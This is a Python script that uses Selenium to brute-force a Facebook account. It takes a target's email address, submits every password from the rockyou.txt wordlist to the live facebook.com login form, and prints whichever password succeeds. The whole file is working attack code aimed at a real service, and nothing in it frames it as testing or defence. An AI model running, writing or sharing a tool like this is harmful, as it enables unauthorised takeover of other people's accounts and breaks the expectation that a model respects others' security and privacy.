#!/usr/bin/python

import sys
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

wordlist = "/usr/share/wordlists/rockyou.txt"

if len(sys.argv) < 2:
    print("usage: %s <email username>" % sys.argv[0])
    sys.exit(1)

driver = webdriver.Firefox()

passwords = open(wordlist)
for pw in passwords:
    print("%s" % pw)
    driver.get("https://facebook.com")
    if not "Facebook" in driver.title:
        print("[*] Failed to load Facebook")
        driver.close

    email = driver.find_element_by_name("email")
    email.clear()
    email.send_keys(sys.argv[1])

    password = driver.find_element_by_name("pass")
    password.clear()
    loginlabel = driver.find_element_by_id("loginbutton")
    submit = loginlabel.find_element_by_tag_name("input")
    password.send_keys(pw)
    submit.send_keys(Keys.RETURN)

    if "Create Post" in driver.title:
        print("[*] SUCCESS! Password: %s" % pw)
        driver.close()
        sys.exit(0)
    time.sleep(3)

print("[*] FAIL! Password not in list.")
driver.close()

